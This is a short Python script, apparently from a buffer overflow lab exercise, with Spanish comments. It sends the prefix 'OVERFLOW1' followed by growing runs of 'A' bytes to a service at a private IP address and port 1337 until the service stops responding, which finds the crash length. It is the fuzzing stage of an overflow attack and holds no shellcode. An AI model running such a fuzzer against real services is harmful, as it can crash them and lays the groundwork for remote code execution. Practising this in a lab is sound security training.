#!/usr/bin/python3

import socket
import time

HOST = "10.10.68.180"
PORT = 1337

cont = 0
cont_max = 10000
cont_to_multiply = 100

try:
    while cont <= cont_max:

        print(f"(+) Enviando {cont} A's")

        # Connection
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((HOST, PORT))
        server.settimeout(5)
        from_server = server.recv(1024)
        
        # Exploit
        payload = (
            b"OVERFLOW1 " +
            b"A" * cont
        )

        server.send(payload)

        from_server = server.recv(1024)
        server.close()

        cont += cont_to_multiply

        time.sleep(1)

except socket.timeout:
    print(f"(+) El programa dejó de responder al enviar {cont} A's")
    print(f"(+) Valor enviado: OVERFLOW1 A*{cont}")
    exit(0)
